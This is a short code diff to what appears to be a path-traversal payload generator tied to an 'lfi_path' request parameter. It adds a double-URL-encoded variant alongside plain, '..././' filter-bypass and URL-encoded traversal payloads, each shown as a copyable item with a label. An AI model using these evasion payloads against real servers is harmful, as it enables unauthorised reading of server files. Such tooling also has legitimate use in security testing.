@@ -46,11 +46,13 @@ if (isset($_REQUEST['lfi_path'])) {
         const simpleTraversal = traversalPath
         const mixedTraversal = traversalPath.replaceAll('../','..././')
         const encodedTraversal = encodeURIComponent(traversalPath)
+        const doubleEncodedTraversal = encodeURIComponent(encodedTraversal)
 
         let output = '';
-        output += `<span class='copy-text'>${simpleTraversal}</span><br>`
-        output += `<span class='copy-text'>${mixedTraversal}</span><br>`
-        output += `<span class='copy-text'>${encodedTraversal}</span><br>`
+        output += `<span class='copy-text' style="cursor: pointer;" title="Basic Payload">${simpleTraversal}</span><br>`
+        output += `<span class='copy-text' style="cursor: pointer;" title="Basic Payload to bypass dumb removal of ../">${mixedTraversal}</span><br>`
+        output += `<span class='copy-text' style="cursor: pointer;" title="URL Encoded Payload">${encodedTraversal}</span><br>`
+        output += `<span class='copy-text' style="cursor: pointer;" title="Double URL Encoded Payload">${doubleEncodedTraversal}</span><br>`
 
         document.getElementById('payloads').innerHTML = output.trim();
         create_copyables();
